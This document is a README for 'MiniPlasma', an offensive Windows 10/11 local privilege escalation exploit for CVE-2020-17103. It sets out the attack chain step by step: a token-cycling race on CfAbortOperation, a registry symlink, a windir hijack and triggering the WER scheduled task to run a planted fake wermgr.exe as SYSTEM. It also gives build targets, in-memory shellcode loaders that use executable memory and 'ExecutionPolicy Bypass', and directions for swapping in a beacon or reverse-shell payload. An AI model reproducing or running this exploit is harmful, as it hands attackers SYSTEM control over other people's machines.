# MiniPlasma Windows LPE

Local privilege escalation for Windows 10/11 abusing the Cloud Files sync engine
(CVE-2020-17103).  A registry-symlink + WER-scheduled-task chain converts
unprivileged `CfAbortOperation` writes into a full **SYSTEM** token that spawns
a process on the user's interactive desktop.

Written in C, based on the proof-of-concept created by github.com/Nightmare-Eclipse and github.com/AlexLinov.
Two variants:

| Variant | Target | Description |
|---------|--------|-------------|
| `miniplasma_sc.c` | **Shellcode** (`_sc`) | Position-independent, no CRT, PEB-walked APIs.  Builds to a flat binary you load in memory. Got assitance from AI for this (Qwen2.5-Coder) |
| `miniplasma.c` | **PE** | Mingw-linked, uses COM + loader-lib imports.  Builds to a standard `.exe`. |

---

## How the Attack Works

### Prerequisite

The Cloud Files filter driver `cldflt.sys` must be loaded on the target.
On most Windows 10/11 systems it starts on demand.  If not:

```
sc start cldflt
```

The `QueueReporting` scheduled task under
`\Microsoft\Windows\Windows Error Reporting` must be present (it is by
default on every Windows 10/11 install).

### Stage 1: CfAbortOperation + token-cycling race

`Stage1` does three things in parallel:

1. **`CheckKeyThread`**: opens `\Registry\User\.DEFAULT\Software\Policies\Microsoft`
   with `KEY_NOTIFY` and blocks on `NtNotifyChangeKey`.  When the notification
   fires (the registry symlink write, below) it sets a done flag and exits.

2. **`ForceTokenThread`**: rapidly toggles the main thread's impersonation token
   between an anonymous token and `NULL` via `NtSetInformationThread` with
   `ThreadImpersonationToken = 5`.  This creates a race window.

3. **Main thread**: calls `CfAbortOperation(GetCurrentProcessId(), NULL,
   AbortHydrationFlagsBlock)` in a tight loop.  Each call triggers a kernel-
   mode write to `\Registry\User\.DEFAULT\Software\Policies\Microsoft\
   CloudFiles\BlockedApps`.

The token-cycling causes the CF driver's `SeCaptureSubjectContext` to sometimes
attribute the write to the anonymous token, which the exploit has already
given full registry access (see Stage 2).

### Stage 2: Registry symlink

Stage 2 opens the `CloudFiles` key, wipes its ACL (Everyone + Anonymous →
GENERIC_ALL), then creates a **registry symbolic link**:

```
\Registry\User\.DEFAULT\...\CloudFiles\BlockedApps
    --[REG_OPTION_CREATE_LINK]-->
\Registry\User\.DEFAULT\Volatile Environment
```

Every subsequent `CfAbortOperation` write is transparently redirected to the
Volatile Environment key.  The race from Stage 1 ensures the write sometimes
succeeds even though the exploit runs as a low-integrity user.

### Stage 3: windir hijack + WER task trigger

1. Deletes the symlink, wipes the Volatile Environment key, then writes
   `windir = C:\ProgramData\mp_<RID>` under `\Volatile Environment` via
   `NtSetValueKey`.

2. Drops a **runner** binary as a fake `wermgr.exe` at
   `C:\ProgramData\mp_<RID>\System32\wermgr.exe`.  In the shellcode variant
   this runner is embedded inside the shellcode as the `runner_pe_data[]`
   byte array (a real PE32+ binary).

3. Creates a named pipe `\\.\pipe\WER_<RID>` and calls `SchRpcRun` (native
   RPC from `taskcomp.dll`) to trigger the `QueueReporting`
   scheduled task.

The WER task runs as **SYSTEM**.  It reads `windir` from the environment,
resolves `%windir%\System32\wermgr.exe`, and executes our planted binary.

### Runner: SYSTEM token → user session

The runner (now running as SYSTEM):

1. Restores `windir` to `C:\Windows`.
2. Reads the config file `C:\ProgramData\mp_<RID>.cfg` (written before Stage 1)
   to find the named-pipe name and the payload path.
3. Connects to the named pipe, calls `GetNamedPipeServerSessionId()` to learn
   the user's session ID (the pipe server is the user process).
4. Opens its own SYSTEM token, duplicates it with `DuplicateTokenEx(TokenPrimary)`,
   sets `TokenSessionId = 12` via `NtSetInformationToken` to the user's session.
5. Calls `CreateProcessAsUserW()`: the new process runs as **SYSTEM on the
   user's desktop**.

---

## Shellcode Architecture

Both `miniplasma_sc.c` and `mini_runner_sc.c` share a common runtime header:

| Component | Location | Role |
|-----------|----------|------|
| `shellcode_common.h` | Shared header | Type defs, PEB walkers, string helpers, ALIGN_STACK, module-name macros |
| `miniplasma_sc.c` | Main exploit | Stages 1–3, entry point `start()` |
| `mini_runner_sc.c` | Runner subsystem | Token dup + CreateProcessAsUserW (embedded as PE data in Stage 3) |


### Embedded runner

`miniplasma_sc_data.h` is an auto-generated header containing the raw bytes
of `mini_runner.exe` (a 2684-byte PE32+ binary compiled from `mini_runner_sc.c`),
placed in `.text` via `__attribute__((section(".text")))` so it survives the
objcopy extraction.  `Stage3` writes it to disk as the fake `wermgr.exe`.

---

## Build

### Windows

Install [MinGW-w64](https://www.mingw-w64.org/) Then from a MinGW terminal:

```sh
make
make shellcode
```

### macOS

Install MinGW-w64 via Homebrew:

```sh
brew install mingw-w64
```

Then cross-compile as usual:

```sh
make               # PE build: build/miniplasma.exe
make shellcode     # Raw shellcode: build/mini_runner_sc.bin, build/miniplasma_sc.bin
make run_ps1       # Self-contained PowerShell loader: build/run_miniplasma.ps1
make clean
```

### Linux

Install MinGW-w64 via your package manager, then build:

```sh
make
make shellcode
```

### Targets

| Command | Output |
|---------|--------|
| `make` | `build/miniplasma.exe` - PE exploit |
| `make shellcode` | `build/miniplasma_sc.bin` + `build/mini_runner_sc.bin` - flat shellcode |
| `make run_ps1` | `build/run_miniplasma.ps1` - PowerShell loader with embedded shellcode |
| `make clean` | Removes `build/` and generated headers |

---

## Example Usage

### Raw shellcode (load in memory)

```
make shellcode
```

**PowerShell**: copy `build/miniplasma_sc.bin` to Windows, then:

```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\path\to\miniplasma_sc.bin")
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]([Action]))
$f.Invoke()
```

Or use the standalone loader:

```
make run_ps1
# Copy build/run_miniplasma.ps1 to Windows and run:
powershell -ExecutionPolicy Bypass -File run_miniplasma.ps1
```

**C loader**:

```c
void *mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(mem, sc_data, sizeof(sc_data));
((void(*)())mem)();
```

### PE wrapper (standalone .exe)

```sh
python3 tools/pe_wrapper.py build/miniplasma_sc.bin build/exploit.exe
# Copy build/exploit.exe to Windows and run directly.
```

### Normal PE test build

```sh
make miniplasma
# Copy build/miniplasma.exe to Windows and run as a normal console app.
```

---

## Custom Payload

By default the exploit launches `C:\Windows\System32\conhost.exe` as the
SYSTEM payload.  To run your own binary, change the `payloadPath` in
`Stage3` of `miniplasma_sc.c` (around line 745):

```c
/* Where to look: the config file contains the payload path written
 * by Stage3 before the stages run.  Change the default here. */
WCHAR payloadPath[] = {
  L'C',L':',L'\\',L'W',L'i',L'n',L'd',L'o',L'w',L's',
  L'\\',L'S',L'y',L's',L't',L'e',L'm',L'3',L'2',
  L'\\',L'c',L'm',L'd',L'.',L'e',L'x',L'e',L'\0'
};
```

Replace with your own PE path (e.g., a beacon DLL spawned via rundll32,
a reverse shell, etc).

If you want the runner subprocess itself to be custom, modify
`mini_runner_sc.c` (the SYSTEM-side token-dup logic).  For instance,
instead of reading the payload path from a config file, hardcode it:

```c
/* In mini_runner_sc.c near line 106, replace the config file read
 * with a hardcoded path: */
WCHAR payloadPath[] = { L'C',L':',L'\\',L't',L'o',L'o',L'l',L's',
                        L'\\',L'b',L'e',L'a',L'c',L'o',L'n',L'.',
                        L'e',L'x',L'e',L'\0' };
```

---

## Notes

- The exploit depends on a **race condition** between the `CfAbortOperation`
  kernel write and the `ForceTokenThread` token cycling.  Timing varies
  across Windows versions and CPU load.
- The shellcode writes to disk (the fake `wermgr.exe` and config file), it
  is not a memory-only attack.
